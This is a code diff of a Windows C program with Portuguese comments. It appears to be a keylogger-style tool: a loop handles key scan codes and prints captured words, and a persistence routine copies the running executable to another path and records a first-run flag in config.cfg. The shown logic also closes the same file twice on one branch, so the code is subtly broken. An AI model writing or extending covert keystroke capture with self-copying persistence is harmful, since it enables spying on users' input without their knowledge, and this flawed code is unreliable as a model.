@@ -81,7 +81,7 @@ int main()
                         system("cls");
                         printf("%s", palavra);
 
-                        //if (scanCode == VK_ESCAPE) return 0;
+                        // if (scanCode == VK_ESCAPE) return 0;
                     }
                 }
             }
@@ -96,9 +96,8 @@ int main()
 bool valPersis()
 {
     FILE *varsConf;
-
-    char chave[50], valor[50];
-    int VerdOuFal = 0; // Verdadeiro ou falso
+    char chave[50];
+    int valor = 0;
 
     varsConf = fopen("config.cfg", "r");
     if (!varsConf)
@@ -115,15 +114,25 @@ bool valPersis()
             if (strcmp(currentPath, newPath) != 0)
             {
                 CopyFile(currentPath, newPath, FALSE);
-                return false;
             }
         }
-
         varsConf = fopen("config.cfg", "w");
-        fprintf(varsConf, "pos=0\n");
+        fprintf(varsConf, "pos=1\n");
         fclose(varsConf);
 
+        return false; // primeira execução
     }
+    else
+    {
+        // Ler config.cfg
+        if (fscanf(varsConf, "%[^=]=%d", chave, &valor) == 2)
+        {
+            fclose(varsConf);
+            if (valor == 1) return true;
+        }
+        fclose(varsConf);
+    }
+
     return false;
 }
 
